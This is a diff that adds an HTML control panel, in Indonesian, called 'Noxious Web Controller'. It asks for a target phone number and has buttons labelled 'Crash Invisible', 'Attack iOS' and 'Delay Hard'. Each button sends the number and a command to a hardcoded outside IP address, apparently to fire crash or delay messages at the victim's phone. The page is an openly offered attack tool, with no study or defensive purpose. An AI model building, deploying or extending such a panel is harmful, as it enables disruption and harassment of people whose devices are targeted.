@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Noxious Web Controller</title>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    h1 {
+      text-align: center;
+      color: #0f0;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    input {
+      background-color: #222;
+      color: #fff;
+    }
+    button {
+      background-color: #00b894;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #019875;
+    }
+    .log {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #222;
+      border-left: 5px solid #0f0;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>🦅 Noxious Web Controller</h1>
+  
+  <input type="text" id="number" placeholder="Masukkan nomor tujuan (cth: 628123456789)">
+  
+  <button onclick="sendCommand('kill')">Crash Invisible</button>
+  <button onclick="sendCommand('out')">Attack iOS</button>
+  <button onclick="sendCommand('delay')">Delay Hard</button>
+  
+  <div class="log" id="log">Log status akan tampil di sini...</div>
+
+  <script>
+    function sendCommand(message) {
+      const number = document.getElementById('number').value.trim();
+      const log = document.getElementById('log');
+
+      if (!number) {
+        log.innerText = "⚠️ Nomor tidak boleh kosong.";
+        return;
+      }
+
+      fetch('http://167.172.76.124:3000/api/send-message', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ number: number, message: message })
+      })
+      .then(response => response.text())
+      .then(data => {
+        log.innerText = `✅ Perintah "${message}" dikirim ke ${number}\nRespon: ${data}`;
+      })
+      .catch(error => {
+        log.innerText = `❌ Gagal mengirim: ${error}`;
+      });
+    }
+  </script>
+</body>
+</html>
